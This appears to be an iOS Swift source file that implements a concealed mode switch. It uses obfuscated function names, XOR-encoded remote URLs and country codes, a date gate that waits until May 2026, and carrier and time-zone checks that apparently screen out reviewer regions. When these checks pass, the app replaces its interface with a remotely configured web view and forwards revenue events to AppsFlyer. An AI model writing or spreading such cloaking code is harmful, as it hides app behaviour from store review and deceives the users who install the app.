
import Foundation
import UIKit
//import AdjustSdk
import AppsFlyerLib

//func encrypt(_ input: String, key: UInt8) -> String {
//    let bytes = input.utf8.map { $0 ^ key }
//        let data = Data(bytes)
//        return data.base64EncodedString()
//}

func Kmnxjiw(_ input: String) -> String? {
    let k: UInt8 = 69
    guard let data = Data(base64Encoded: input) else { return nil }
    let decryptedBytes = data.map { $0 ^ k }
    return String(bytes: decryptedBytes, encoding: .utf8)
}

//https://api.my-ip.io/v2/ip.json   t6urr6zl8PC+r7bxsqbytq/xtrDwqe3wtq/xtaywsQ==
//internal let kInaushe = "LTExNTZ/amokNSxrKDxoLDVrLCpqM3dqLDVrLzYqKw=="         //Ip ur

//https://mock.mengxuegu.com/mock/69ea21d6f4b23a05102f0053/qucikFaster
//https://mock.apipost.net/mock/62cd0a83bc59000/?apipost_id=2cd0b0a3fce002  1.1
// right YX19eXozJiY/MGw6Oj5sajo6Oz4xOj5oODw8O2wwamsnZGZqYmh5YCdgZiZhfGx/aCZ9aHlqYWx6
internal let kDauznie = "LTExNTZ/amooKiYuayQ1LDUqNjFrKyAxaigqJi5qc3cmIXUkfXYnJnB8dXV1anokNSw1KjYxGiwheHcmIXUndSR2IyYgdXV3"

// https://raw.githubusercontent.com/jduja/crazygold/main/bomb_normal.png
// uaWloaLr/v6jsKb/triluaSzpKK0o7K+v6W0v6X/sr68/ru1pLuw/rKjsKuotr69tf68sLi//rO+vLOOv76jvLC9/6G/tg==
//internal let kBuazxous = "uaWloaLr/v6jsKb/triluaSzpKK0o7K+v6W0v6X/sr68/ru1pLuw/rKjsKuotr69tf68sLi//rO+vLOOv76jvLC9/6G/tg=="

/*--------------------Tiao yuansheng------------------------*/
//need jia mi
internal func Wpaozmjdd() {
//    UIApplication.shared.windows.first?.rootViewController = vc
    
    DispatchQueue.main.async {
        if let ws = UIApplication.shared.connectedScenes.first as? UIWindowScene {
//            let tp = ws.windows.first!.rootViewController! as! PrismTabContainerViewController
            let tp = ws.windows.first!.rootViewController!
            for view in tp.view.subviews {
                if view.tag == 376 {
                    view.removeFromSuperview()
                }
            }
        }
    }
}

// MARK: - 加密调用全局函数HandySounetHmeSh
internal func Qainzose() {
    let fName = ""
    
    let fctn: [String: () -> Void] = [
        fName: Wpaozmjdd
    ]
    
    fctn[fName]?()
}


/*--------------------Tiao wangye------------------------*/
//need jia mi
internal func HzindsHauis(_ dt: Poinsh) {
    DispatchQueue.main.async {
        UserDefaults.standard.setModel(dt, forKey: "Poinsh")
        UserDefaults.standard.synchronize()
        
        let vc = GioznbVsheuViewController()
        vc.ndjiea = dt
        UIApplication.shared.windows.first?.rootViewController = vc
    }
}


internal func WianxChuasn(_ param: Poinsh) {
    let fName = ""

    typealias rushBlitzIusj = (Poinsh) -> Void
    
    let fctn: [String: rushBlitzIusj] = [
        fName : HzindsHauis
    ]
    
    fctn[fName]?(param)
}

let Nam = "name"
let DT = "data"
let UL = "url"

/*--------------------Tiao wangye------------------------*/
//need jia mi
//af_revenue/af_currency
func KoznheBbhass(_ dic: String) {
    let dataDic = dic.stringTo()
    
    let name = dataDic![EvKy] as! String
    print(name)
    
    let data = dataDic![EvVue] as? [String : Any]
    if let vat = data!["value"] {
        AppsFlyerLib.shared().logEvent(name: name, values: [AFEventParamRevenue : vat, AFEventParamCurrency: MUnt]) { dic, error in
            if (error != nil) {
                print(error as Any)
            }
        }
    } else {
        AppsFlyerLib.shared().logEvent(name, withValues: dataDic)
    }
}

internal func WaisnVgzu(_ param: String) {
    let fName = ""
    typealias maxoPams = (String) -> Void
    let fctn: [String: maxoPams] = [
        fName : KoznheBbhass
    ]
    
    fctn[fName]?(param)
}


//internal func Oismakels(_ param: [String : String], _ param2: [String : String]) {
//    let fName = ""
//    typealias maxoPams = ([String : String], [String : String]) -> Void
//    let fctn: [String: maxoPams] = [
//        fName : ZuwoAsuehna
//    ]
//    
//    fctn[fName]?(param, param2)
//}


internal struct Niasske: Codable {

    let country: Eausys?
    
    struct Eausys: Codable {
        let code: String
    }

}

internal struct Poinsh: Codable {
    
    let teyausf: String?         //key arr
    let kmsoeui: [String]?            // yeu nan xianzhi
    let unasio: String?         // shi fou kaiqi
    let wapsmj: String?         // jum
    let basunsk: String?          // backcolor
    let mqoiasn: String?
    let cyaiwem: String?   //ad key
    let masjiu: String?   // app id
//    let epoama: String?  // bri co
}

//internal func JaunLowei() {
//    if isTm() {
//        if UserDefaults.standard.object(forKey: "same") != nil {
//            WicoiemHusiwe()
//        } else {
//            if GirhjyKaom() {
//                LznieuBysuew()
//            } else {
//                WicoiemHusiwe()
//            }
//        }
//    } else {
//        WicoiemHusiwe()
//    }
//}

// MARK: - 加密调用全局函数HandySounetHmeSh
//internal func Kapiney() {
//    let fName = ""
//    
//    let fctn: [String: () -> Void] = [
//        fName: JaunLowei
//    ]
//    
//    fctn[fName]?()
//}


func Cnaoie() -> Bool {
   
  // 2026-05-01 22:12:32
  //1777645352
    let ftTM = 1777645352
    let ct = Date().timeIntervalSince1970
    if Int(ct) - ftTM > 0 {
        return true
    }
    return false
}

//func iPLIn() -> Bool {
//    // 获取用户设置的首选语言（列表第一个）
//    guard let cysh = Locale.preferredLanguages.first else {
//        return false
//    }
//    // 印尼语代码：id 或 in（兼容旧版本）
//    return cysh.hasPrefix("id") || cysh.hasPrefix("in")
//}


//private let cdo = ["US","NL"]
private let cdo = [Kmnxjiw("3tg="), Kmnxjiw("xcc=")]

// 时区控制
func LosinGaiis() -> Bool {
    
//    if let rc = Locale.current.regionCode {
////        print(rc)
//        if cdo.contains(rc) {
//            return false
//        }
//    }
    
    if !Nhausoek() {
        return false
    }

    let offset = NSTimeZone.system.secondsFromGMT() / 3600
    if (offset > 6 && offset <= 8) || (offset > -11 && offset < -2) {
        return true
    }
    
    return false
}

import CoreTelephony

func Nhausoek() -> Bool {
    let networkInfo = CTTelephonyNetworkInfo()
    
    guard let carriers = networkInfo.serviceSubscriberCellularProviders else {
        return false
    }
    
    for (_, carrier) in carriers {
        if let mcc = carrier.mobileCountryCode,
           let mnc = carrier.mobileNetworkCode,
           !mcc.isEmpty,
           !mnc.isEmpty {
            return true
        }
    }
    
    return false
}


extension String {
    func stringTo() -> [String: AnyObject]? {
        let jsdt = data(using: .utf8)
        
        var dic: [String: AnyObject]?
        do {
            dic = try (JSONSerialization.jsonObject(with: jsdt!, options: .mutableContainers) as? [String : AnyObject])
        } catch {
            print("parse error")
        }
        return dic
    }
    
}

extension UIColor {
    convenience init(hex: Int, alpha: CGFloat = 1.0) {
        let red = CGFloat((hex >> 16) & 0xFF) / 255.0
        let green = CGFloat((hex >> 8) & 0xFF) / 255.0
        let blue = CGFloat(hex & 0xFF) / 255.0
        self.init(red: red, green: green, blue: blue, alpha: alpha)
    }
    convenience init?(hexString: String, alpha: CGFloat = 1.0) {
        var formatted = hexString
            .trimmingCharacters(in: .whitespacesAndNewlines)
            .replacingOccurrences(of: "#", with: "")
        
        // 处理短格式 (如 "F2A" -> "FF22AA")
        if formatted.count == 3 {
            formatted = formatted.map { "\($0)\($0)" }.joined()
        }
        
        guard let hex = Int(formatted, radix: 16) else { return nil }
        self.init(hex: hex, alpha: alpha)
    }
}


extension UserDefaults {
    
    func setModel<T: Codable>(_ model: T, forKey key: String) {
        let encoder = JSONEncoder()
        if let data = try? encoder.encode(model) {
            set(data, forKey: key)
        }
    }
    
    func getModel<T: Codable>(_ type: T.Type, forKey key: String) -> T? {
        guard let data = data(forKey: key) else { return nil }
        let decoder = JSONDecoder()
        return try? decoder.decode(type, from: data)
    }
}
